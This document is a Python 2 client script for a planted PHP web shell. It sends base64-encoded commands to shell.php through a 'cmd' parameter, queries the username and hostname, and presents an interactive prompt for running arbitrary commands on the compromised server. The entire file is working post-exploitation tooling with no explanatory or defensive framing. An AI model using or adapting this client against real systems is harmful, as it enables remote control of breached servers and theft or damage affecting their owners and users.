#!/usr/bin/python
 
import random
import requests
import string
import base64

def encodeRequest(command, encoding):
    if encoding == "base64":
        command = base64.b64encode(command)
    else:
        print "Only Base64 is currently supported"
    return command

def decodeResponse(response, encoding):
    if encoding == "base64":
        # http://stackoverflow.com/questions/2941995/python-ignore-incorrect-padding-error-when-base64-decoding
        missing_padding = len(response) % 4
        if missing_padding != 0:
            response += b'='* (4 - missing_padding)
        response = base64.decodestring(response)
    else:
        print "Only Base64 is currently supported"
    return response

def sendRequest(session, method, url, param, command):
    if method == "get":
        r = session.get(url, params={param: command})
    elif method == "post":
        r = session.post(url, data={param: command})
    else:
        print "Only GET and POST are currently supported"
    return r

def main():
    session = requests.Session()
    session.trust_env = False
     
    # Configuration values
    ip = "127.0.0.1"
    port = "8123"
    filename = "shell.php"
    method = "post"  # alternate is get
    encoding = "base64"  # only supported algorithm for now
    param = "cmd"
    
    print filename
    
    url = "http://" + ip + ":" + port + "/" + filename
    
    print "\n[*] Connecting to web shell:"
    print "    " + url
    
    print "\n[*] Obtaining username."

    r = sendRequest(session, method, url, param, encodeRequest("whoami", encoding))
    username = decodeResponse(r.text, encoding)
    
    if "\\" in username:
        username = username.split("\\",1)[1]
        
    print "\n[*] Obtaining hostname."
    
    r = sendRequest(session, method, url, param, encodeRequest("hostname", encoding))
    hostname = decodeResponse(r.text, encoding)
    
    print "\n[+] Returning prompt!\n\n"
    
    try:
        while True:
            cmd = raw_input(username + "@" + hostname + ":~$ ")
            if cmd == "exit":
                print "\n\n[-] EXITING\n"
                return
            else:
                r = sendRequest(session, method, url, param, encodeRequest(cmd, encoding))
                print decodeResponse(r.text, encoding) + "\n"
    except KeyboardInterrupt:
        print "\n\n\n[-] EXITING\n"
        return
    
if __name__ == "__main__":
    main()